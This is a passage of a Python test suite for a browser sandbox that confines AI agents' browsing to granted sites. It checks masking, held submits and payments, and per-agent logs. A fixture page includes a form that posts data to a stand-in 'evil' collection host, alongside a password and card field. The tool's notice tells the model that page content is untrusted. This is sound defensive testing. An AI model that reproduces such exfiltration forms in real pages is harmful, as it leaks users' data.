        with patch("dgc.pip_chat._owed_turn", side_effect=lambda store, pip, text, *a, **k: told.append(text) or {"run": {"id": "run_x"}}), \
                patch("dgc.pip_chat._computer_conversation", return_value=None):
            pip_chat.continue_after_computer(self.store, self.ben["id"], card["id"], card["summary"], self.cfg)
        self.assertTrue(dgc_browser.grants_for(self.registry, self.ben["id"]).admits(SHOP))
        self.assertTrue(dgc_browser.grants_for(self.registry, self.ava["id"]).admits(SHOP), "Ava's own grant stays")
        self.assertFalse(dgc_browser.grants_for(self.registry, self.ava["id"]).admits(NOTES))
        self.assertEqual(len(told), 1)
        self.assertIn("dgc_browser", told[0])
        self.assertIn(f"https://{SHOP}/kettle", told[0], "it opens the page it wanted again")

    def test_a_card_only_the_person_answers_grants(self):
        self.assertIsNone(dgc_browser.allow_pip_site(self.registry, "newsite-shop.com", self.ben["id"], "local-computer"))
        self.assertIsNone(dgc_browser.allow_pip_site(self.registry, "localhost", self.ben["id"], "editor-user"))
        self.assertIsNone(dgc_browser.allow_pip_site(self.registry, "router.lan", self.ben["id"], "editor-user"))

    def test_signed_in_carries_on_and_not_now_says_what_it_couldnt_do(self):
        ava, run = self.lane(self.ava)
        self.step(ava, run, "open", url=f"https://{SHOP}/")
        self.step(ava, run, "sign_in")
        ava.end(run)
        [card] = self.pending(self.ava, self.lanes.SIGN_IN_KIND)
        from dgc import pip_chat
        words = []
        with patch("dgc.pip_chat._owed_turn", side_effect=lambda store, pip, text, *a, **k: words.append(text) or {"run": {"id": "run_y"}}), \
                patch("dgc.pip_chat._send_in", side_effect=lambda store, pip, text, *a, **k: words.append(text) or {"run": {"id": "run_z"}}), \
                patch("dgc.pip_chat._computer_conversation", return_value=None):
            pip_chat.continue_after_computer(self.store, self.ava["id"], card["id"], card["summary"], self.cfg)
            pip_chat.continue_after_rejection(self.store, self.ava["id"], card["id"], card["summary"], self.cfg)
        self.assertIn("signed in", words[0])
        self.assertIn("dgc_browser", words[0])
        self.assertIn("didn't sign in", words[1])


# --------------------------------------------------------------------------- attribution

class Attribution(LaneBase):
    def test_its_tab_says_whose_it_is_and_what_it_sent_is_in_its_own_sent_log(self):
        ava, run = self.lane(self.ava)
        self.step(ava, run, "open", url=f"https://{SHOP}/")
        session = self.chrome.session_of(self.yb.lane_of(self.ava["id"]))
        scripts = [m["params"] for m in self.chrome.calls("Page.addScriptToEvaluateOnNewDocument", session)]
        titled = [p for p in scripts if "Ava" in p.get("source", "")]
        self.assertTrue(titled, "its tab's title says it is Ava's")
        self.assertEqual(titled[0].get("worldName"), "dgc-lane", "in DGC's own world, out of the page's reach")
        self.assertTrue(self.chrome.calls("Page.setInterceptFileChooserDialog", session),
                        "no file picker of a lane's ever opens on the person's screen")
        person = self.chrome.session_of(self.person)
        self.assertEqual([m for m in self.chrome.sent if m.get("sessionId") == person and m.get("method") in
                          ("Fetch.enable", "Page.setInterceptFileChooserDialog")], [], "the person's own tab: no gate")
        self.assertEqual([m["params"].get("worldName") for m in self.chrome.calls("Page.addScriptToEvaluateOnNewDocument", person)],
                         [dgc_browser.NOTICE_WORLD], "no Pip's name in their tab: only DGC's watcher for their own sign-ins")
        self.assertEqual(dgc_browser.lane_title("Ava \u00b7 Lane Store", "Ava"), "Lane Store")
        browser = self.yb.browser
        browser._observe({"method": "Network.requestWillBeSent", "sessionId": session,
                          "params": {"requestId": "N1", "request": {"url": f"https://{SHOP}/api/price", "method": "GET"}}})
        browser._observe({"method": "Network.loadingFinished", "sessionId": session,
                          "params": {"requestId": "N1", "encodedDataLength": 900}})
        browser.lane_sent.flush()
        lines = [json.loads(l) for l in (dgc_browser.folder(self.registry.directory) / "sent.jsonl").read_text().splitlines()]
        self.assertTrue(any(l["pip_id"] == self.ava["id"] and l["host"] == SHOP for l in lines))
        self.assertFalse(any(l["pip_id"] != self.ava["id"] for l in lines))


# --------------------------------------------------------------------------- the tool the model is offered

class Tool(unittest.TestCase):
    def test_one_tool_its_own_words_the_browser_subset(self):
        from dgc import dgc_browser_lane
        blind = dgc_browser_lane.schema(None)["function"]
        self.assertEqual(blind["name"], "dgc_browser")
        ops = set(blind["parameters"]["properties"]["op"]["enum"])
        self.assertTrue({"open", "read", "click", "type", "scroll", "back", "forward", "tabs", "sign_in"} <= ops)
        for never in ("run", "files", "upload", "close_browser", "desktop_look", "click_at", "look", "send_to_chat"):
            self.assertNotIn(never, ops)
        self.assertNotIn("pip_id", blind["parameters"]["properties"], "a run never names a Pip")
        self.assertIn("look", dgc_browser_lane.schema("own")["function"]["parameters"]["properties"]["op"]["enum"])
        notice = dgc_browser_lane.NOTICE
        for words in ("untrusted", "never", "password", "allow"):
            self.assertIn(words, notice.lower())
        self.assertNotIn(" AI", notice)


# --------------------------------------------------------------------------- the run: its socket beside its computer's

from tests.test_one_kind_pips import FolderChat  # noqa: E402


class Offered(FolderChat, unittest.TestCase):
    """The worker offers the tool only with the controller's pin beside its computer's, and tells it DGC Browser's rules."""

    PIN = {"socket": "/nonexistent-yb.sock", "token": "t" * 48}

    def test_a_run_with_its_tab_is_offered_the_tool_and_told_the_rules(self):
        seen = self.turn(self.queued(self.pip), dgc_browser_socket=dict(self.PIN))
        self.assertIn("dgc_browser", seen["tools"])
        self.assertIn("computer", seen["tools"])
        self.assertIn("DGC Browser: the user's own Google Chrome", seen["system"])
        seen = self.turn(self.queued(self.pip, key="m-2"))
        self.assertNotIn("dgc_browser", seen["tools"], "no pin, no tool")
        self.assertNotIn("DGC Browser: the user's own Google Chrome", seen["system"])

    def test_never_without_its_computer_and_a_pin_that_names_more_is_refused(self):
        seen = self.turn(self.queued(self.pip, key="m-3"), box=False, dgc_browser_socket=dict(self.PIN))
        self.assertNotIn("dgc_browser", seen["tools"], "its tab comes only beside its own computer")
        with self.assertRaises(pips.RegistryError):
            self.turn(self.queued(self.pip, key="m-4"), dgc_browser_socket={**self.PIN, "pip_id": self.pip["id"]})


# --------------------------------------------------------------------------- the installed Google Chrome, sandbox on

def _installed_chrome():
    from dgc.pip_computer_box import _real_binary
    path = Path("/opt/google/chrome/chrome")
    return path if _real_binary(path) and dgc_browser.sandbox_ok(path) else None


REAL_SHOP, REAL_OTHER = "shop.lanestore.com", "evil.lanecollect.net"
REAL_PAGE = """<!doctype html><title>Lane Store</title><h1>Kettle</h1><p>Price: 42.00</p>
<form method="post" action="/cart"><input name="item" value="kettle"><button>Add to cart</button></form>
<form method="post" action="http://evil.lanecollect.net:PORT/collect"><input name="note" value="hi"><button>Send to a friend</button></form>
<form method="post" action="/checkout/pay"><input name="card_number" value="4242424242424242"><button>Pay now</button></form>
<label>Password <input type="password" name="password" value="hunter2"></label>
<a href="/go">Elsewhere</a>"""


def _real_site():
    received = []

    class Handler(http.server.BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def reply(self, body, status=200, location=""):
            self.send_response(status)
            if location:
                self.send_header("Location", location)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            host = self.headers.get("Host", "").split(":")[0]
            received.append(("GET", host, self.path))
            port = self.server.server_address[1]
            if self.path == "/go":
                self.reply(b"", 302, f"http://{REAL_OTHER}:{port}/landing")
            else:
                self.reply(REAL_PAGE.replace("PORT", str(port)).encode() if host == REAL_SHOP else b"<title>Other</title>other")

        def do_POST(self):
            length = int(self.headers.get("Content-Length") or 0)
            received.append(("POST", self.headers.get("Host", "").split(":")[0], self.path, self.rfile.read(length).decode()))
            self.reply(b"<title>Done</title>done")

    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    server.daemon_threads = True
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server, received


@unittest.skipUnless(_installed_chrome(), "needs Google Chrome installed from its package")
class RealChromeLane(unittest.TestCase):
    """The installed Google Chrome, its sandbox on, with no display (as over Remote-SSH): a local site under public names
    (Chrome's own resolver maps them to this computer; only the test adds that and Chrome's basic password store)."""

    def test_a_pips_lane_in_real_chrome_is_confined_held_masked_and_kept_off_the_persons_tab(self):
        fixtures.LocalPipsTests.setUp(self)
        from dgc import dgc_browser_lane
        self.addCleanup(dgc_browser_lane.forget_all)
        server, received = _real_site()
        self.addCleanup(server.shutdown)
        port = server.server_address[1]
        personal = self.registry.personal()["id"]
        ava = self.store.create(personal, "Ava", None, "editor-user", pip_type="lens", computer_plan={"schema_version": 1})
        ben = self.store.create(personal, "Ben", None, "editor-user", pip_type="lens", computer_plan={"schema_version": 1})
        dgc_browser.allow_pip_site(self.registry, REAL_SHOP, ava["id"], "editor-user")
        env = {k: v for k, v in os.environ.items() if k not in ("DISPLAY", "WAYLAND_DISPLAY")}
        flags = ("--password-store=basic", f"--host-resolver-rules=MAP *.lanestore.com 127.0.0.1:{port}, "
                                           f"MAP *.lanecollect.net 127.0.0.1:{port}")
        with patch.dict(os.environ, env, clear=True):
            yb = dgc_browser.DgcBrowserHost(self.registry.directory, chrome=_installed_chrome(), test_flags=flags)
            self.addCleanup(yb.close)
            yb.open(f"http://{REAL_SHOP}:{port}/", None, headless=True)        # the person's own tab, on the same shop
            person = yb.person_tabs()[0]
            lane = dgc_browser_lane.LaneHost(self.registry.directory, ava["id"], ava["workspace_id"], yb=yb)
            run = self.store.enqueue(ava["id"], "yb-real-a", "local-console", self.cfg)["id"]
            lane.add_run(run, self.base / "frames")
            step = lambda op, **a: lane.act_for(run, op, a)["text"]       # noqa: E731
            read = step("open", url=f"http://{REAL_SHOP}:{port}/")
            self.assertIn("Price: 42.00", read)
            self.assertIn("(hidden)", read, "a password on the page is never read back")
            self.assertNotIn("hunter2", read)
            target = yb.lane_of(ava["id"])
            with yb.lock:
                info = yb.browser._browser_call("Target.getTargetInfo", {"targetId": target})["targetInfo"]
            self.assertTrue(info["title"].startswith("Ava \u00b7"), info["title"])
            refs = {m.group(2): m.group(1) for m in re.finditer(r'button "([^"]+)" \[(e\d+)\]', read)}
            ref = {v: k for k, v in refs.items()}
            said = step("click", ref=ref["Send to a friend"])
            self.assertNotIn(REAL_OTHER, [r[1] for r in received], "a write to another site never leaves")
            self.assertIn("Not sent", said)
            received.clear()
            said = step("open", url=f"http://{REAL_SHOP}:{port}/go")
            self.assertEqual([r for r in received if r[1] == REAL_OTHER], [], "a redirect out of its grants never loads")
            self.assertIn("below your reply", said)
            sites = [json.loads(r[0]).get("site") for r in self.registry.db.execute(
                "SELECT summary FROM pip_computer_actions WHERE pip_id=? AND status='pending'", (ava["id"],)).fetchall()]
            self.assertEqual(sites, ["lanecollect.net"], "the person is asked, on a card")
            lane.waiting.clear()                                   # (the next step, as after the person said Not now)
            read = step("open", url=f"http://{REAL_SHOP}:{port}/")
            refs = {m.group(1): m.group(2) for m in re.finditer(r'button "([^"]+)" \[(e\d+)\]', read)}
            self.assertIn("Add to cart", refs, read)
            said = step("click", ref=refs["Add to cart"])
            self.assertIn("Held", said)
            self.assertNotIn("/cart", [r[2] for r in received if r[0] == "POST"], "its submit waits for the person")
            lane.waiting.clear()                                   # (the next step, as after the person decided)
            read = step("open", url=f"http://{REAL_SHOP}:{port}/")
            refs = {m.group(1): m.group(2) for m in re.finditer(r'button "([^"]+)" \[(e\d+)\]', read)}
            step("click", ref=refs["Pay now"])
            self.assertNotIn("/checkout/pay", [r[2] for r in received if r[0] == "POST"], "a payment never goes by itself")
            # Ben has no grant: refused, nothing asked of the site, and Ava's tab and the person's are none of his.
            other = dgc_browser_lane.LaneHost(self.registry.directory, ben["id"], ben["workspace_id"], yb=yb)
            run_b = self.store.enqueue(ben["id"], "yb-real-b", "local-console", self.cfg)["id"]
            other.add_run(run_b, self.base / "frames-b")
            before = len(received)
            self.assertIn("isn't one of the sites", other.act_for(run_b, "open", {"url": f"http://{REAL_SHOP}:{port}/"})["text"])
            self.assertEqual(len(received), before)
            lane.end(run)
            with yb.lock:
                title = yb.browser._browser_call("Target.getTargetInfo", {"targetId": person})["targetInfo"]["title"]
            self.assertEqual(title, "Lane Store", "the person's own tab is untouched (no Pip's name, never driven)")
            yb.browser.lane_sent.flush()
            lines = [json.loads(l) for l in (dgc_browser.folder(self.registry.directory) / "sent.jsonl").read_text().splitlines()]
            self.assertTrue(any(l["pip_id"] == ava["id"] and l["host"] == REAL_SHOP and l["kind"] == "request" for l in lines), lines)
            self.assertTrue(any(l["pip_id"] == ava["id"] and l["kind"] == "refused" for l in lines), lines)
            self.assertFalse(any(l["pip_id"] != ava["id"] for l in lines), "never the person's own traffic, never Ben's")
            yb.close()


if __name__ == "__main__":
    unittest.main()
